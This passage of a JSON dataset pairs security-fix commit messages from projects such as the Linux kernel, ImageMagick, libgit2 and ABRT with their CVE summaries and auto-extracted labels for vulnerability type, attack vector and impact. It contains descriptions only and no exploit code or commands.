includes an attacker who is not granted full filesystem access by a hosting provider, but can reconfigure the home directory of an FTP user.","commit_message_1":"merge pull request # <number> from proftpd\/auth-symlinks-anywhere-in-chroot","Vulnerability Type":"Link Following","Attack Vector":"By replacing a path component with a symbolic link","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"4ef1b2869447411ad3ef91ad7d4891a83c1a509a","cve_id":"CVE-2017-7277","cwe_id":"CWE-125","commit_message":"tcp: mark skbs with SCM_TIMESTAMPING_OPT_STATS\n\nSOF_TIMESTAMPING_OPT_STATS can be enabled and disabled\nwhile packets are collected on the error queue.\nSo, checking SOF_TIMESTAMPING_OPT_STATS in sk->sk_tsflags\nis not enough to safely assume that the skb contains\nOPT_STATS data.\n\nAdd a bit in sock_exterr_skb to indicate whether the\nskb contains opt_stats data.\n\nFixes: 1c885808e456 (\"tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING\")\nReported-by: JongHwan Kim <zzoru007@gmail.com>\nSigned-off-by: Soheil Hassas Yeganeh <soheil@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: Willem de Bruijn <willemb@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The TCP stack in the Linux kernel through 4.10.6 mishandles the SCM_TIMESTAMPING_OPT_STATS feature, which allows local users to obtain sensitive information from the kernel's internal socket data structures or cause a denial of service (out-of-bounds read) via crafted system calls, related to net\/core\/skbuff.c and net\/socket.c.","commit_message_1":"mark skbs with scm_timestamping_opt_stats sof_timestamping_opt_stats can be enabled and disabled while packet are collected on the error queue","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted system calls , related to net \/ core \/ skbuff . c and net \/ socket . c","Impact":"obtain sensitive information from the kernel ' s internal socket data structures or cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"b8402ed0733e3f244588b61ad5fedd093e3cf9cc","cve_id":"CVE-2017-7185","cwe_id":"CWE-416","commit_message":"Fix crash in multipart handling\n\nClose cesanta\/dev#6974\n\nPUBLISHED_FROM=4d4e4a46eceba10aec8dacb7f8f58bd078c92307","summary":"Use-after-free vulnerability in the mg_http_multipart_wait_for_boundary function in mongoose.c in Cesanta Mongoose Embedded Web Server Library 6.7 and earlier and Mongoose OS 1.2 and earlier allows remote attackers to cause a denial of service (crash) via a multipart\/form-data POST request without a MIME boundary string.","commit_message_1":"fix crash in multipart handling","Vulnerability Type":"Use After Free","Attack Vector":"via a multipart \/ form - data post request without a mime boundary string","Impact":"cause a denial of service ( crash )","Root Cause":"caused by use-after-free issue","Attack Type":"remote attacker"},{"commit_id":"677e806da4d916052585301785d847c3b3e6186a","cve_id":"CVE-2017-7184","cwe_id":null,"commit_message":"xfrm_user: validate XFRM_MSG_NEWAE XFRMA_REPLAY_ESN_VAL replay_window\n\nWhen a new xfrm state is created during an XFRM_MSG_NEWSA call we\nvalidate the user supplied replay_esn to ensure that the size is valid\nand to ensure that the replay_window size is within the allocated\nbuffer.  However later it is possible to update this replay_esn via a\nXFRM_MSG_NEWAE call.  There we again validate the size of the supplied\nbuffer matches the existing state and if so inject the contents.  We do\nnot at this point check that the replay_window is within the allocated\nmemory.  This leads to out-of-bounds reads and writes triggered by\nnetlink packets.  This leads to memory corruption and the potential for\npriviledge escalation.\n\nWe already attempt to validate the incoming replay information in\nxfrm_new_ae() via xfrm_replay_verify_len().  This confirms that the user\nis not trying to change the size of the replay state buffer which\nincludes the replay_esn.  It however does not check the replay_window\nremains within that buffer.  Add validation of the contained\nreplay_window.\n\nCVE-2017-7184\nSigned-off-by: Andy Whitcroft <apw@canonical.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The xfrm_replay_verify_len function in net\/xfrm\/xfrm_user.c in the Linux kernel through 4.10.6 does not validate certain size data after an XFRM_MSG_NEWAE update, which allows local users to obtain root privileges or cause a denial of service (heap-based out-of-bounds access) by leveraging the CAP_NET_ADMIN capability, as demonstrated during a Pwn2Own competition at CanSecWest 2017 for the Ubuntu 16.10 linux-image-* package 4.8.0.41.52.","commit_message_1":"validate xfrm_msg_newae xfrma_replay_esn_val replay_window when a new xfrm state is created during an xfrm_msg_newsa call we validate the user supplied replay_esn to ensure that the size is valid and to ensure that the replay_window size is within the allocated buffer","Vulnerability Type":"heap-based out-of-bounds access","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain root privileges or cause a denial of service ( heap - based out - of - bounds access )","Root Cause":"does not validate certain size data after an xfrm _ msg _ newae update","Attack Type":"local attacker"},{"commit_id":"b173ac05993f634a42be3d3535e1b158de0c3372","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"Merge some file writing extension checks from OpenJK.\n\nThanks Ensiform.\nhttps:\/\/github.com\/JACoders\/OpenJK\/commit\/05928a57f9e4aae15a3bd0\nhttps:\/\/github.com\/JACoders\/OpenJK\/commit\/ef124fd0fc48af164581176","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"merge some file writing extension check from openjk","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"f61fe5f6a0419ef4a88d46a128052f2e8352e85d","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"Don't open .pk3 files as OpenAL drivers.","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"do n't open","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"11a83410153756ae350a82ed41b08d128ff7f998","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"All: Merge some file writing extension checks","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"all : merge some file writing extension check","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"b248763e4878ef12d5835ece6600be8334f67da1","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"All: Don't open .pk3 files as OpenAL drivers","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"all : do n't open","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"b6ff2bcb1e4e6976d61e316175c6d7c99860fe20","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"All: Don't load .pk3s as .dlls, and don't load user config files from .pk3s","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"do n't load","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"376267d534476a875d8b9228149c4ee18b74a4fd","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"Don't load .pk3s as .dlls, and don't load user config files from .pk3s.","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"do n't load","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"b8a4ff9775318ca5e679183884a6a63f3da8f863","cve_id":"CVE-2017-5940","cwe_id":"CWE-269","commit_message":"replace copy_file with copy_file_as_user","summary":"Firejail before 0.9.44.6 and 0.9.38.x LTS before 0.9.38.10 LTS does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero, which allows local users to conduct sandbox-escape attacks via vectors involving a symlink and the --private option. NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-5180.","commit_message_1":"replace copy_file with copy_file_as_user","Vulnerability Type":"Improper Privilege Management","Attack Vector":"via vectors involving a symlink and the - - private option .","Impact":"conduct sandbox - escape attacks","Root Cause":"does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero ,","Attack Type":"local attacker"},{"commit_id":"903fd8a0789ca3cc3c21d84cd0282481515592ef","cve_id":"CVE-2017-5940","cwe_id":"CWE-269","commit_message":"security fix","summary":"Firejail before 0.9.44.6 and 0.9.38.x LTS before 0.9.38.10 LTS does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero, which allows local users to conduct sandbox-escape attacks via vectors involving a symlink and the --private option. NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-5180.","commit_message_1":"security fix","Vulnerability Type":"Improper Privilege Management","Attack Vector":"via vectors involving a symlink and the - - private option .","Impact":"conduct sandbox - escape attacks","Root Cause":"does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero ,","Attack Type":"local attacker"},{"commit_id":"7d65a814ac76bd04760072c33e452371692ee790","cve_id":"CVE-2017-5511","cwe_id":"CWE-119","commit_message":"Fix improper cast that could cause an overflow as demonstrated in #347.","summary":"coders\/psd.c in ImageMagick allows remote attackers to have unspecified impact by leveraging an improper cast, which triggers a heap-based buffer overflow.","commit_message_1":"fix improper cast that could cause an overflow a demonstrated in # <number>","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging an improper cast , which triggers a heap - based buffer overflow","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by psd.c","Attack Type":"remote attacker"},{"commit_id":"e87af64b1ff1635a32d9b6162f1b0e260fb54ed9","cve_id":"CVE-2017-5510","cwe_id":"CWE-787","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/348","summary":"coders\/psd.c in ImageMagick allows remote attackers to have unspecified impact via a crafted PSD file, which triggers an out-of-bounds write.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted psd file","Impact":"have unspecified impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"37a1710e2dab6ed91128ea648d654a22fbe2a6af","cve_id":"CVE-2017-5509","cwe_id":"CWE-787","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/350","summary":"coders\/psd.c in ImageMagick allows remote attackers to have unspecified impact via a crafted PSD file, which triggers an out-of-bounds write.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted psd file","Impact":"have unspecified impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"ee735086f8670be1591fa9593e80dd60163a7a2f","cve_id":"CVE-2016-10156","cwe_id":"CWE-264","commit_message":"util-lib: use MODE_INVALID as invalid value for mode_t everywhere","summary":"A flaw in systemd v228 in \/src\/basic\/fs-util.c caused world writable suid files to be created when using the systemd timers features, allowing local attackers to escalate their privileges to root. This is fixed in v229.","commit_message_1":"util-lib : use mode_invalid a invalid value for mode_t everywhere","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"By creating world writable suid files when using the systemd timers","Impact":"escalate their privileges to root","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"b5c6a1b407b7f8b952bded2789593b68b1876211","cve_id":"CVE-2016-10130","cwe_id":"CWE-284","commit_message":"http: check certificate validity before clobbering the error variable","summary":"The http_connect function in transports\/http.c in libgit2 before 0.24.6 and 0.25.x before 0.25.1 might allow man-in-the-middle attackers to spoof servers by leveraging clobbering of the error variable.","commit_message_1":"http : check certificate validity before clobbering the error variable","Vulnerability Type":"Improper Access Control","Attack Vector":"by leveraging clobbering of the error variable","Impact":"spoof servers","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"84d30d569ada986f3eef527cbdb932643c2dd037","cve_id":"CVE-2016-10129","cwe_id":"CWE-476","commit_message":"smart_pkt: treat empty packet lines as error\n\nThe Git protocol does not specify what should happen in the case\nof an empty packet line (that is a packet line \"0004\"). We\ncurrently indicate success, but do not return a packet in the\ncase where we hit an empty line. The smart protocol was not\nprepared to handle such packets in all cases, though, resulting\nin a `NULL` pointer dereference.\n\nFix the issue by returning an error instead. As such kind of\npackets is not even specified by upstream, this is the right\nthing to do.","summary":"The Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to cause a denial of service (NULL pointer dereference) via an empty packet line.","commit_message_1":"treat empty packet line a error the git protocol doe not specify what should happen in the case of an empty packet line ( that is a packet line `` <number> '' )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an empty packet line","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"4ac39c76c0153d1ee6889a0984c39e97731684b2","cve_id":"CVE-2016-10128","cwe_id":"CWE-119","commit_message":"smart_pkt: verify packet length exceeds PKT_LEN_SIZE\n\nEach packet line in the Git protocol is prefixed by a four-byte\nlength of how much data will follow, which we parse in\n`git_pkt_parse_line`. The transmitted length can either be equal\nto zero in case of a flush packet or has to be at least of length\nfour, as it also includes the encoded length itself. Not\nchecking this may result in a buffer overflow as we directly pass\nthe length to functions which accept a `size_t` length as\nparameter.\n\nFix the issue by verifying that non-flush packets have at least a\nlength of `PKT_LEN_SIZE`.","summary":"Buffer overflow in the git_pkt_parse_line function in transports\/smart_pkt.c in the Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to have unspecified impact via a crafted non-flush packet.","commit_message_1":"verify packet length exceeds pkt_len_size each packet line in the git protocol is prefixed by a four-byte length of how much data will follow , which we parse in ` git_pkt_parse_line `","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted non - flush packet","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by the git_pkt_parse_line function","Attack Type":"remote attacker"},{"commit_id":"77f619d48259383628c3ec4654b1ad578e9eb40e","cve_id":"CVE-2016-9933","cwe_id":"CWE-119","commit_message":"fix #215 gdImageFillToBorder stack-overflow when invalid color is used","summary":"Stack consumption vulnerability in the gdImageFillToBorder function in gd.c in the GD Graphics Library (aka libgd) before 2.2.2, as used in PHP before 5.6.28 and 7.x before 7.0.13, allows remote attackers to cause a denial of service (segmentation violation) via a crafted imagefilltoborder call that triggers use of a negative color value.","commit_message_1":"fix # <number> gdimagefilltoborder stack-overflow when invalid color is used","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted imagefilltoborder call that triggers use of a negative color value","Impact":"cause a denial of service ( segmentation violation )","Root Cause":"caused by a stack consumption vulnerability","Attack Type":"remote attacker"},{"commit_id":"b5ed738f8060266bf4ae521f7e3ed145aa4498a3","cve_id":"CVE-2016-7530","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/110","summary":"The quantum handling code in ImageMagick allows remote attackers to cause a denial of service (divide-by-zero error or out-of-bounds write) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( divide - by - zero error or out - of - bounds write )","Root Cause":"caused by an out-of-bounds access error","Attack Type":"remote attacker"},{"commit_id":"d9b2209a69ee90d8df81fb124eb66f593eb9f599","cve_id":"CVE-2016-7526","cwe_id":"CWE-787","commit_message":"Fixed out-of-bounds write reported in: https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/102","summary":"coders\/wpg.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds write) via a crafted file.","commit_message_1":"fixed out-of-bounds write reported in : http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out of bound write error","Attack Type":"remote attacker"},{"commit_id":"198fffab4daf8aea88badd9c629350e5b26ec32f","cve_id":"CVE-2016-7514","cwe_id":"CWE-125","commit_message":"Added check for bit depth 1.","summary":"The ReadPSDChannelPixels function in coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"added check for bit depth <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"280215b9936d145dd5ee91403738ccce1333cab1","cve_id":"CVE-2016-7514","cwe_id":"CWE-125","commit_message":"Rewrite reading pixel values.","summary":"The ReadPSDChannelPixels function in coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"rewrite reading pixel value","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"6f1879d498bcc5cce12fe0c5decb8dbc0f608e5d","cve_id":"CVE-2016-7514","cwe_id":"CWE-125","commit_message":"Fixed overflow.","summary":"The ReadPSDChannelPixels function in coders\/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.","commit_message_1":"fixed overflow","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted psd file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"58b6dde319c301b0eae27d12e2a659e067d80558","cve_id":"CVE-2016-6906","cwe_id":"CWE-125","commit_message":"Fix OOB reads of the TGA decompression buffer\n\nIt is possible to craft TGA files which will overflow the decompression\nbuffer, but not the image's bitmap. Therefore we also have to check for\npotential decompression buffer overflows.\n\nThis issue had been reported by Ibrahim El-Sayed to security@libgd.org;\na modified case exposing an off-by-one error of the first patch had been\nprovided by Konrad Beckmann.\n\nThis commit is an amendment to commit fb0e0cce, so we use CVE-2016-6906\nas well.","summary":"The read_image_tga function in gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA file, related to the decompression buffer.","commit_message_1":"fix oob read of the tga decompression buffer it is possible to craft tga file which will overflow the decompression buffer , but not the image 's bitmap","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tga file , related to the decompression buffer","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"3ab016764c7f787829d9065440d86f5609765110","cve_id":"CVE-2015-8959","cwe_id":"CWE-399","commit_message":"http:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=3&t=26861","summary":"coders\/dds.c in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (CPU consumption) via a crafted DDS file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted dds file","Impact":"cause a denial of service ( cpu consumption )","Root Cause":"caused by corrupted DDS files","Attack Type":"remote attacker"},{"commit_id":"78f82d9d1c2944725a279acd573a22168dc6e22a","cve_id":"CVE-2015-8957","cwe_id":"CWE-119","commit_message":"http:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=3&t=26838","summary":"Buffer overflow in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (application crash) via a crafted SUN file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted sun file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an out-of-bounds read error on SUN files","Attack Type":"remote attacker"},{"commit_id":"c5759e7b76f5bf844be6c6641cc1b356bbc83869","cve_id":"CVE-2015-5232","cwe_id":"CWE-362","commit_message":"Fix scripts and code that use well-known tmp files.","summary":"Race conditions in opa-fm before 10.4.0.0.196 and opa-ff before 10.4.0.0.197.","commit_message_1":"fix script and code that use well-known tmp file","Vulnerability Type":"Race Condition","Attack Vector":"using unknown attack vectors","Impact":"execute arbitrary code","Root Cause":"caused by various \/tmp races","Attack Type":"local attacker"},{"commit_id":"edab5be6665b9e8de66c25ba527509b229468573","cve_id":"CVE-2015-4054","cwe_id":"CWE-476","commit_message":"Check if auth_user is set.\n\nFixes a crash if password packet appears before startup packet (#42).","summary":"PgBouncer before 1.5.5 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) by sending a password packet before a startup packet.","commit_message_1":"check if auth_user is set","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by sending a password packet before a startup packet","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"99aa4d2b4fd12c6bef62d02ffd1b375ddd42fcf4","cve_id":"CVE-2015-3400","cwe_id":"CWE-200","commit_message":"Move nfs.c:foreach_nfs_shareopt() to libshare.c:foreach_shareopt()\nso that it can be (re)used in other parts of libshare.","summary":"sharenfs 0.6.4, when built with commits bcdd594 and 7d08880 from the zfs repository, provides world readable access to the shared zfs file system, which might allow remote authenticated users to obtain sensitive information by reading shared files.","commit_message_1":"to <file> : foreach_shareopt ( ) so that it can be ( re ) used in other part of libshare","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading shared files","Impact":"obtain sensitive information","Root Cause":"caused by the failure to restrict read access by sharenfs","Attack Type":"remote attacker"},{"commit_id":"4f2c1ddd3e3b81d2d5146b883115371f1cada9f9","cve_id":"CVE-2015-3315","cwe_id":"CWE-59","commit_message":"ccpp: do not read data from root directories\n\nUsers are allowed to modify \/proc\/[pid]\/root to any directory by running\ntheir own MOUNT namespace.\n\nRelated: #1211835\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"Automatic Bug Reporting Tool (ABRT) allows local users to read, change the ownership of, or have other unspecified impact on arbitrary files via a symlink attack on (1) \/var\/tmp\/abrt\/*\/maps, (2) \/tmp\/jvm-*\/hs_error.log, (3) \/proc\/*\/exe, (4) \/etc\/os-release in a chroot, or (5) an unspecified root directory related to librpm.","commit_message_1":"do not read data from root directory user are allowed to modify \/proc\/ [ pid ] \/root to any directory by running their own mount namespace","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on ( 1 ) \/ var \/ tmp \/ abrt \/ * \/ maps , ( 2 ) \/ tmp \/ jvm - * \/ hs _ error . log , ( 3 ) \/ proc \/ * \/ exe , ( 4 ) \/ etc \/ os - release in a chroot , or ( 5 ) an unspecified root directory related to librpm .","Impact":"overwrite arbitrary files","Root Cause":"overwrite arbitrary files","Attack Type":"local attacker"},{"commit_id":"80408e9e24a1c10f85fd969e1853e0f192157f92","cve_id":"CVE-2015-3315","cwe_id":"CWE-59","commit_message":"ccpp: fix symlink race conditions\n\nFix copy & chown race conditions\n\nRelated: #1211835\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"Automatic Bug Reporting Tool (ABRT) allows local users to read, change the ownership of, or have other unspecified impact on arbitrary files via a symlink attack on (1) \/var\/tmp\/abrt\/*\/maps, (2) \/tmp\/jvm-*\/hs_error.log, (3) \/proc\/*\/exe, (4) \/etc\/os-release in a chroot, or (5) an unspecified root directory related to librpm.","commit_message_1":"fix symlink race condition fix copy & chown race condition","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on ( 1 ) \/ var \/ tmp \/ abrt \/ * \/ maps , ( 2 ) \/ tmp \/ jvm - * \/ hs _ error . log , ( 3 ) \/ proc \/ * \/ exe , ( 4 ) \/ etc \/ os - release in a chroot , or ( 5 ) an unspecified root directory related to librpm .","Impact":"overwrite arbitrary files","Root Cause":"overwrite arbitrary files","Attack Type":"local attacker"},{"commit_id":"d6e2f6f128cef4c21cb80941ae674c9842681aa7","cve_id":"CVE-2015-3315","cwe_id":"CWE-59","commit_message":"ccpp: open file for dump_fd_info with O_EXCL\n\nTo avoid possible races.\n\nRelated: #1211835\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"Automatic Bug Reporting Tool (ABRT) allows local users to read, change the ownership of, or have other unspecified impact on arbitrary files via a symlink attack on (1) \/var\/tmp\/abrt\/*\/maps, (2) \/tmp\/jvm-*\/hs_error.log, (3) \/proc\/*\/exe, (4) \/etc\/os-release in a chroot, or (5) an unspecified root directory related to librpm.","commit_message_1":"open file for dump_fd_info with o_excl to avoid possible race","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on ( 1 ) \/ var \/ tmp \/ abrt \/ * \/ maps , ( 2 ) \/ tmp \/ jvm - * \/ hs _ error . log , ( 3 ) \/ proc \/ * \/ exe , ( 4 ) \/ etc \/ os - release in a chroot , or ( 5 ) an unspecified root directory related to librpm .","Impact":"overwrite arbitrary files","Root Cause":"overwrite arbitrary files","Attack Type":"local attacker"},{"commit_id":"723416fa4210b7464b28eab89cc76252e6193ac1","cve_id":"CVE-2015-3215","cwe_id":"CWE-20","commit_message":"NetKVM: BZ#1169718: Checking the length only on read\n\nSigned-off-by: Joseph Hindin <yhindin@rehat.com>","summary":"The NetKVM Windows Virtio driver allows remote attackers to cause a denial of service (guest crash) via a crafted length value in an IP packet, as demonstrated by a value that does not account for the size of the IP options.","commit_message_1":"netkvm : bz # <number> : checking the length only on read","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted length value in an ip packet , as demonstrated by a value that does not account for the size of the ip options","Impact":"cause a denial of service ( guest crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"8939398b82006ba1fec4ed491339fc075f43fc7c","cve_id":"CVE-2015-1870","cwe_id":"CWE-200","commit_message":"make the dump directories owned by root by default\n\nIt was discovered that the abrt event scripts create a user-readable\ncopy of a sosreport file in abrt problem directories, and include\nexcerpts of \/var\/log\/messages selected by the user-controlled process\nname, leading to an information disclosure.\n\nThis issue was discovered by Florian Weimer of Red Hat Product Security.\n\nRelated: #1212868\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"The event scripts in Automatic Bug Reporting Tool (ABRT) uses world-readable permission on a copy of sosreport file in problem directories, which allows local users to obtain sensitive information from \/var\/log\/messages via unspecified vectors.","commit_message_1":"make the dump directory owned by root by default it wa discovered that the abrt event script create a user-readable copy of a sosreport file in abrt problem directory , and include excerpt of \/var\/log\/messages selected by the user-controlled process name , leading to an information disclosure","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via unspecified vectors","Impact":"obtain sensitive information from \/ var \/ log \/ messages","Root Cause":"uses world - readable permission on a copy of sosreport file","Attack Type":"local attacker"},{"commit_id":"504ada82b6fa38a30c846c1c29116af7290decb2","cve_id":"CVE-2014-9907","cwe_id":"CWE-20","commit_message":"Added check for bogus num_images value.","summary":"coders\/dds.c in ImageMagick allows remote attackers to cause a denial of service via a crafted DDS file.","commit_message_1":"added check for bogus num_images value","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted dds file","Impact":"cause a denial of service","Root Cause":"caused by corrupted DDS files","Attack Type":"remote attacker"},{"commit_id":"21eae25a8db5fdcd112dbcfcd9e5c37e32d32e2f","cve_id":"CVE-2014-9907","cwe_id":"CWE-20","commit_message":"Moved EOF check.","summary":"coders\/dds.c in ImageMagick allows remote attackers to cause a denial of service via a crafted DDS file.","commit_message_1":"moved eof check","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted dds file","Impact":"cause a denial of service","Root 